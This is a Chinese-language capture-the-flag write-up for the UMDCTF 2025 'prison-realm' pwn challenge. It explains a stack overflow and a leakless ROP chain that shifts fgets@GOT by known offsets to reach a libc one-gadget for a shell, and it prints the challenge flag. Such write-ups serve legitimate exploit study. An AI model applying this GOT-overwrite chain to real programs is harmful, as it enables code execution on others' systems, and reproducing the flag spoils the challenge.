# UMDCTF 2025 - prison-realm

## 题目简述

题面声称程序启用了 Canary、PIE，并提供地址泄漏，但这与实际附件不符。对仓库中的
`prison` 检查可见：64 位、NX、Partial RELRO、无 Canary、无 PIE，也没有输出地址。
源码中的真实漏洞只是直接的栈溢出：

```c
char barrier_dimension_realm[30];
fgets(barrier_dimension_realm, 300, stdin);
```

编译器为数组分配了 `0x20` 字节栈空间，所以从缓冲区起点到返回地址共 40 字节。
无 PIE 让程序内 gadget 固定；Partial RELRO 则允许修改已经解析的 `fgets@GOT`。

## 解题过程

### 1. 把 `fgets@GOT` 从函数入口推到内部序列

官方 payload 先使用：

```text
0x400608: pop rbp; ret
0x4005cf: add bl, dh; ret
0x400668: add dword ptr [rbp-0x3d], ebx
```

令 `rbp = 0x60105d` 后，第三个 gadget 的写入目标正好是
`0x601020`，即 `fgets@GOT`。在随题提供的 Ubuntu 22.04 libc 中，第一次
`fgets` 返回时 `rbx = 0`，而 `rdx` 低位保留流状态 `0xfbad208b`，故
`dh = 0x20`。

连续执行三次 `add bl, dh` 得到 `ebx = 0x60`，再执行三次 GOT 加法，最终给
`fgets` 的已解析地址增加 `0x120`：

```text
fgets@GOT := libc_base + 0x7f380 + 0x120
           = libc_base + 0x7f4a0
```

`fgets+0x120` 不是正常函数入口，而是“向 `[rdi]` 写一个零字节，随后恢复
`rbx`、`rbp`、`r12`、`r13`、`r14` 并返回”的内部路径。它可以作为一次寄存器
装载和栈展开序列。

### 2. 再把 GOT 推到 one-gadget

使用 `0x400782`：

```asm
pop rdi
xor rbx, rbx
ret
```

把 `rdi` 设为可写的 `0x601000`，然后调用 `fgets@plt`。由于 GOT 已被修改，
实际执行 `fgets+0x120`。官方链为它准备的五个恢复值是：

```text
rbx = 0x6c842
rbp = 0x60105d
r12 = 0
r13 = 0
r14 = 0
```

返回后再执行一次 `add dword ptr [rbp-0x3d], ebx`，于是：

```text
0x7f4a0 + 0x6c842 = 0xebce2
```

`0xebce2` 是随题 libc 中的 one-gadget：

```text
execve("/bin/sh", rbp-0x50, r12)
```

它要求 `rbp-0x48` 可写，并要求 `r13` 为空或构成有效 `argv`，`r12` 为空或构成
有效 `envp`。上述恢复值同时满足这些约束。第二次调用 `fgets@plt` 时，GOT 已指向
`libc_base + 0xebce2`，因此直接获得 shell，读到：

```text
UMDCTF{are_you_sice_man_because_you_were_BORN_TO_ALLOC_WORLD_IS_A_HEAP_Free_Em_All_1972_or_are_you_BORN_TO_ALLOC_WORLD_IS_A_HEAP_Free_Em_All_1972_because_you_are_sice_man}
```

## 方法总结

本题是一条无泄漏的 GOT 相对改写链。ASLR 隐藏了 libc 基址，但已解析 GOT 项本身
已经包含正确高位；攻击者只需给低位增加已知的函数内偏移和 one-gadget 差值。
分析题目时必须以实际二进制为准，不能把题面关于保护机制的叙述当作事实。这里题面
所谓 Canary、PIE 和地址泄漏都是误导，真正可用的是固定程序 gadget、可写 GOT，
以及指定 libc 调用返回后留下的寄存器状态。
